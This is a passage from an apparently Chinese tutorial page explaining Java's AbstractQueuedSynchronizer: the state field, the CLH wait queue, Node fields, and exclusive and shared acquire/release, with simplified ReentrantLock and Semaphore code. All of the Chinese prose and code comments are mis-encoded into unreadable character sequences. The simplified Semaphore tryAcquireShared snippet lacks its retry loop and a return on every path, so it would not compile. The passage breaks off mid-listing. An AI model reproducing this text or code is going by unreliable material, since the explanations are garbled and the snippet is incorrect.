<li>æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼šå®šä¹‰ç®—æ³•éª¨æ¶ï¼Œå­ç±»å®ç°å…·ä½“æ­¥éª¤</li>
<li>çŠ¶æ€æ¨¡å¼ï¼šæ ¹æ®stateçš„ä¸åŒå€¼ï¼Œæ‰§è¡Œä¸åŒçš„é€»è¾‘</li>
</ul>
<h4 data-id="heading-120">AQSçš„æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<p><strong>ä¸»è¦ç»„æˆï¼š</strong></p>
<ol>
<li>
<p><strong>stateï¼ˆåŒæ­¥çŠ¶æ€ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state; <span class="hljs-comment">// volatileä¿è¯å¯è§æ€§</span>
</code></pre>
</li>
<li>
<p><strong>ç­‰å¾…é˜Ÿåˆ—ï¼ˆCLHé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é˜Ÿåˆ—å¤´èŠ‚ç‚¹ï¼ˆè™šæ‹ŸèŠ‚ç‚¹ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node head;
<span class="hljs-comment">// é˜Ÿåˆ—å°¾èŠ‚ç‚¹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node tail;
</code></pre>
</li>
<li>
<p><strong>NodeèŠ‚ç‚¹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(); <span class="hljs-comment">// å…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-comment">// ç‹¬å æ¨¡å¼</span>
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å–æ¶ˆçŠ¶æ€</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;    <span class="hljs-comment">// éœ€è¦å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>; <span class="hljs-comment">// åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>; <span class="hljs-comment">// ä¼ æ’­çŠ¶æ€</span>
    
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;  <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€</span>
    <span class="hljs-keyword">volatile</span> Node prev;       <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;       <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;   <span class="hljs-comment">// çº¿ç¨‹å¼•ç”¨</span>
    Node nextWaiter;          <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹</span>
}
</code></pre>
</li>
</ol>
<h4 data-id="heading-121">CLHé˜Ÿåˆ—</h4>
<p><strong>CLHé˜Ÿåˆ—çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>**CLHï¼ˆCraig, Landin, and Hagerstenï¼‰**æ˜¯ä¸€ç§è‡ªæ—‹é”é˜Ÿåˆ—</li>
<li>AQSå¯¹CLHé˜Ÿåˆ—è¿›è¡Œäº†æ”¹è¿›ï¼Œä½¿ç”¨åŒå‘é“¾è¡¨</li>
<li>ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼ˆheadï¼‰ç®€åŒ–æ“ä½œ</li>
<li>èŠ‚ç‚¹é€šè¿‡CASæ“ä½œå…¥é˜Ÿå’Œå‡ºé˜Ÿ</li>
</ul>
<p><strong>é˜Ÿåˆ—ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">head</span> (è™šæ‹ŸèŠ‚ç‚¹)
  â†“
Node1 â†â†’ Node2 â†â†’ Node3 (<span class="hljs-built_in">tail</span>)
  â†‘        â†‘        â†‘
Thread1  Thread2  Thread3
</code></pre>
<h3 data-id="heading-122">6.2 AQSçš„æ ¸å¿ƒæ–¹æ³•</h3>
<h4 data-id="heading-123">tryAcquire/tryReleaseï¼ˆç‹¬å æ¨¡å¼ï¼‰</h4>
<p><strong>ç‹¬å æ¨¡å¼ï¼ˆExclusiveï¼‰ï¼š</strong> åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ç‹¬å æ¨¡å¼å°±åƒåªæœ‰ä¸€ä¸ªåº§ä½çš„ä¼šè®®å®¤</li>
<li>å…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å¾…å½“å‰çº¿ç¨‹é‡Šæ”¾é”</li>
<li>å…¸å‹åº”ç”¨ï¼šReentrantLock</li>
</ul>
<h5 data-id="heading-124">tryAcquireï¼ˆå°è¯•è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> getState();  <span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€</span>
    
    <span class="hljs-keyword">if</span> (state == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼Œå°è¯•CASè·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
            setExclusiveOwnerThread(Thread.currentThread());
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è·å–æˆåŠŸ</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isCurrentThreadOwner()) {
        <span class="hljs-comment">// å¯é‡å…¥ï¼šå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œstate+1</span>
        setState(state + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è·å–å¤±è´¥</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²ï¼ˆstate == 0ï¼‰</li>
<li>å¦‚æœç©ºé—²ï¼ŒCASå°è¯•è·å–é”</li>
<li>å¦‚æœå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œæ”¯æŒå¯é‡å…¥</li>
<li>è¿”å›trueè¡¨ç¤ºè·å–æˆåŠŸï¼Œfalseè¡¨ç¤ºå¤±è´¥</li>
</ol>
<h5 data-id="heading-125">tryReleaseï¼ˆå°è¯•é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">newState</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// çŠ¶æ€å‡1</span>
    
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();  <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
    
    <span class="hljs-keyword">if</span> (newState == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å®Œå…¨é‡Šæ”¾é”</span>
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
        setState(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œåªæ›´æ–°state</span>
        setState(newState);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹ï¼ˆé˜²æ­¢éæ³•é‡Šæ”¾ï¼‰</li>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>è¿”å›trueè¡¨ç¤ºé”å·²å®Œå…¨é‡Šæ”¾ï¼Œfalseè¡¨ç¤ºè¿˜æœ‰é‡å…¥æ¬¡æ•°</li>
</ol>
<h4 data-id="heading-126">tryAcquireShared/tryReleaseSharedï¼ˆå…±äº«æ¨¡å¼ï¼‰</h4>
<p><strong>å…±äº«æ¨¡å¼ï¼ˆSharedï¼‰ï¼š</strong> å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å…±äº«æ¨¡å¼å°±åƒå›¾ä¹¦é¦†ï¼Œå¤šä¸ªäººå¯ä»¥åŒæ—¶è¿›å…¥</li>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡</li>
<li>å…¸å‹åº”ç”¨ï¼šSemaphoreï¼ˆä¿¡å·é‡ï¼‰ã€ReadWriteLockçš„è¯»é”</li>
</ul>
<h5 data-id="heading-127">tryAcquireSharedï¼ˆå°è¯•è·å–å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–å…±äº«é”ã€‚</p>
<p><strong>è¿”å›å€¼å«ä¹‰ï¼š</strong></p>
<ul>
<li><strong>è´Ÿæ•°</strong>ï¼šè·å–å¤±è´¥</li>
<li><strong>0</strong>ï¼šè·å–æˆåŠŸï¼Œä½†æ²¡æœ‰å‰©ä½™èµ„æºäº†</li>
<li><strong>æ­£æ•°</strong>ï¼šè·å–æˆåŠŸï¼Œè¿˜æœ‰å‰©ä½™èµ„æº</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> getState();        <span class="hljs-comment">// è·å–å¯ç”¨è®¸å¯è¯æ•°</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> available - acquires;  <span class="hljs-comment">// è®¡ç®—å‰©ä½™æ•°é‡</span>
    
    <span class="hljs-comment">// èµ„æºä¸è¶³ï¼ˆremaining &lt; 0ï¼‰æˆ–CASæˆåŠŸ</span>
    <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span> || compareAndSetState(available, remaining))
        <span class="hljs-keyword">return</span> remaining;  <span class="hljs-comment">// è¿”å›å‰©ä½™æ•°é‡</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡ï¼ˆå¦‚Semaphoreçš„è®¸å¯è¯æ•°ï¼‰</li>
<li>å°è¯•è·å–æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>å¦‚æœèµ„æºè¶³å¤Ÿï¼ŒCASæ›´æ–°state</li>
<li>è¿”å›å‰©ä½™èµ„æºæ•°é‡</li>
</ol>
<h5 data-id="heading-128">tryReleaseSharedï¼ˆå°è¯•é‡Šæ”¾å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾å…±äº«é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> getState();      <span class="hljs-comment">// å½“å‰èµ„æºæ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current + releases; <span class="hljs-comment">// é‡Šæ”¾åçš„èµ„æºæ•°</span>
        
        <span class="hljs-keyword">if</span> (compareAndSetState(current, next))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// é‡Šæ”¾æˆåŠŸ</span>
        <span class="hljs-comment">// CASå¤±è´¥ï¼Œè‡ªæ—‹é‡è¯•</span>
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>é‡Šæ”¾æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>stateå¢åŠ </li>
<li>ä½¿ç”¨CASæ›´æ–°ï¼Œå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</li>
<li>è¿”å›trueè¡¨ç¤ºé‡Šæ”¾æˆåŠŸ</li>
</ol>
<h4 data-id="heading-129">acquire/acquireSharedï¼ˆè·å–é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•æ˜¯AQSæä¾›çš„æ¨¡æ¿æ–¹æ³•ï¼Œå®ç°äº†å®Œæ•´çš„è·å–é”æµç¨‹ã€‚</strong></p>
<h5 data-id="heading-130">acquireï¼ˆç‹¬å æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ï¼ŒåŒ…æ‹¬å°è¯•è·å–ã€å…¥é˜Ÿã€é˜»å¡ç­‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•è·å–é”</span>
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¤±è´¥åˆ™åŠ å…¥é˜Ÿåˆ—å¹¶è‡ªæ—‹å°è¯•</span>
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        <span class="hljs-comment">// æ­¥éª¤3ï¼šå¦‚æœè¢«ä¸­æ–­ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€</span>
        selfInterrupt();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryAcquire</span>(arg)
   â”œâ”€ æˆåŠŸ â†’ ç›´æ¥è¿”å›ï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†“

<span class="hljs-number">2</span>. <span class="hljs-built_in">addWaiter</span>(Node.EXCLUSIVE)
   â””â”€ åˆ›å»ºèŠ‚ç‚¹ï¼ŒåŠ å…¥ç­‰å¾…é˜Ÿåˆ—

<span class="hljs-number">3</span>. <span class="hljs-built_in">acquireQueued</span>(node, arg)
   â”œâ”€ è‡ªæ—‹å°è¯•è·å–é”
   â”œâ”€ æˆåŠŸ â†’ è¿”å›falseï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†’ é˜»å¡çº¿ç¨‹ï¼Œç­‰å¾…è¢«å”¤é†’

<span class="hljs-number">4</span>. <span class="hljs-built_in">selfInterrupt</span>()
   â””â”€ å¦‚æœè¢«ä¸­æ–­è¿‡ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å…ˆå°è¯•å¿«é€Ÿè·å–é”ï¼ˆtryAcquireï¼‰</li>
<li>å¤±è´¥åˆ™åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹å°è¯•ï¼Œè¿˜ä¸è¡Œå°±é˜»å¡</li>
<li>ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾é”åå”¤é†’</li>
</ul>
<h5 data-id="heading-131">acquireSharedï¼ˆå…±äº«æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// tryAcquireSharedè¿”å›å€¼ &lt; 0 è¡¨ç¤ºè·å–å¤±è´¥</span>
    <span class="hljs-keyword">if</span> (tryAcquireShared(arg) &lt; <span class="hljs-number">0</span>)
        doAcquireShared(arg);  <span class="hljs-comment">// å¤±è´¥åˆ™è¿›å…¥å…±äº«æ¨¡å¼è·å–æµç¨‹</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•è·å–å…±äº«èµ„æº</li>
<li>è¿”å›å€¼å°äº0è¡¨ç¤ºèµ„æºä¸è¶³</li>
<li>å¤±è´¥åˆ™è¿›å…¥é˜Ÿåˆ—ç­‰å¾…</li>
</ul>
<h4 data-id="heading-132">release/releaseSharedï¼ˆé‡Šæ”¾é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•å®ç°äº†å®Œæ•´çš„é‡Šæ”¾é”æµç¨‹ï¼ŒåŒ…æ‹¬å”¤é†’ç­‰å¾…çº¿ç¨‹ã€‚</strong></p>
<h5 data-id="heading-133">releaseï¼ˆç‹¬å æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹é‡Šæ”¾é”ï¼Œå¹¶å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {  <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¦‚æœé˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹ï¼Œå”¤é†’ä¸‹ä¸€ä¸ª</span>
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);  <span class="hljs-comment">// å”¤é†’åç»§èŠ‚ç‚¹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// é‡Šæ”¾å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼‰</span>
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryRelease</span>(arg)
   â”œâ”€ æˆåŠŸï¼ˆå®Œå…¨é‡Šæ”¾ï¼‰ â†’ ç»§ç»­ä¸‹ä¸€æ­¥
   â””â”€ å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥ï¼‰ â†’ è¿”å›false

<span class="hljs-number">2</span>. <span class="hljs-built_in">unparkSuccessor</span>(h)
   â””â”€ å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•é‡Šæ”¾é”</li>
<li>å¦‚æœå®Œå…¨é‡Šæ”¾ï¼Œå”¤é†’é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ul>
<h5 data-id="heading-134">releaseSharedï¼ˆå…±äº«æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹é‡Šæ”¾èµ„æºï¼Œå¹¶å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">releaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryReleaseShared(arg)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾èµ„æº</span>
        doReleaseShared();  <span class="hljs-comment">// å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ï¼ˆå¯èƒ½å¤šä¸ªï¼‰</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>é‡Šæ”¾å…±äº«èµ„æº</li>
<li>å”¤é†’æ‰€æœ‰ç­‰å¾…è¯¥èµ„æºçš„çº¿ç¨‹</li>
<li>å¤šä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¢«å”¤é†’ï¼ˆå› ä¸ºå…±äº«æ¨¡å¼å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è·å–ï¼‰</li>
</ul>
<h3 data-id="heading-135">6.3 AQSçš„å®ç°åŸç†</h3>
<h4 data-id="heading-136">çŠ¶æ€å˜é‡state</h4>
<p><strong>stateçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>åœ¨ä¸åŒåŒæ­¥å™¨ä¸­æœ‰ä¸åŒå«ä¹‰ï¼š
<ul>
<li>ReentrantLockï¼šè¡¨ç¤ºé‡å…¥æ¬¡æ•°</li>
<li>Semaphoreï¼šè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</li>
<li>CountDownLatchï¼šè¡¨ç¤ºè®¡æ•°å™¨å€¼</li>
<li>ReentrantReadWriteLockï¼šé«˜16ä½è¡¨ç¤ºè¯»é”ï¼Œä½16ä½è¡¨ç¤ºå†™é”</li>
</ul>
</li>
</ul>
<p><strong>stateçš„è®¿é—®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> state;
}

<span class="hljs-comment">// è®¾ç½®state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;
}

<span class="hljs-comment">// CASæ›´æ–°state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}
</code></pre>
<h4 data-id="heading-137">èŠ‚ç‚¹Nodeç»“æ„</h4>
<p><strong>NodeèŠ‚ç‚¹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºå…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºç‹¬å æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€å€¼</span>
